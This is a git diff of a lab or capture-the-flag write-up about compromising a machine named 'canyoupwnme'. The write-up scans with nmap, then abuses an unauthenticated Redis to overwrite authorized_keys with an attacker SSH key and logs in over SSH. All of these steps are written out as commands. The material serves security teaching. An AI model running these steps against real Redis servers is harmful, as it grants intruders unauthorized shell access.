@@ -6,7 +6,7 @@ target machine.
 
 ## Port scanning to identify Redis
 
-Let's try to scan the target machine (`canyoupwnme`)
+Let's try to scan the target machine (`canyoupwnme`) with `nmap`
 
     $ nmap -A -T4 -sT -p1-65535 canyoupwnme
     ...
@@ -15,7 +15,7 @@ Let's try to scan the target machine (`canyoupwnme`)
     6379/tcp  open  redis       Redis key-value store
     ...
 
-Seems that Redis is binded on the default port.
+Seems that Redis is binded on the default port and SSH on custom port 1322.
 
 ## Check for Redis AUTH
 
@@ -51,7 +51,8 @@ information via Redis `INFO` command
 ## Preparing the SSH key
 
 The antirez's attack exploits Redis to upload the SSH pubkey on the target
-machine. Let's start by creating a new set of keys.
+machine. Let's start by creating a new set of keys that we use to access the
+machine.
 
     $ mkdir ssh-redis
     $ ssh-keygen -f ./ssh-redis/attacker
@@ -79,17 +80,17 @@ After a while, we get the following path
 ## Do the attack
 
 As indicated by antirez, the idea at the base of the attack is to use the
-`SAVE` command to overwrite the `authnorized_keys` file. All the attack's
-steps are well explained in the antirez's blog.
+`SAVE` command to overwrite the `authorized_keys` file of the victim. All the
+attack's steps are well explained in the antirez's blog.
 
-*   generating the blob to be injected
+*   Generating the blob to be injected
 
         $ echo -e '\n\n' >> blob.txt
         $ cat ssh-redis/attacker.pub >> blob.txt
         $ echo -e '\n\n' >> blob.txt
 
-*   getting the current Redis' configuration (`dir` is already set due to the
-    path's identification step)
+*   Getting the current Redis' configuration (`dir` is already set due to the
+    previous path's identification phase)
 
         $ redis-cli -h canyoupwnme
         canyoupwnme:6379> CONFIG GET dir
@@ -99,7 +100,7 @@ steps are well explained in the antirez's blog.
         1) "dbfilename"
         2) "dump.rdb"
 
-*   update the Redis' configuration
+*   Update the Redis' configuration
 
         $ redis-cli -h canyoupwnme
         canyoupwnme:6379> CONFIG SET dbfilename "authorized_keys"
@@ -110,7 +111,7 @@ steps are well explained in the antirez's blog.
         1) "dbfilename"
         2) "authorized_keys"
 
-*   do the attack
+*   Do the attack
 
         $ # flushing the current Reids' db
         $ redis-cli -h canyoupwnme flushall
@@ -122,7 +123,7 @@ steps are well explained in the antirez's blog.
         $ redis-cli -h canyoupwnme save
         OK
 
-*   try SSH login
+*   Try the SSH login
 
         $ ssh -l user -i ssh-redis/attacker canyoupwnme -p1322
 
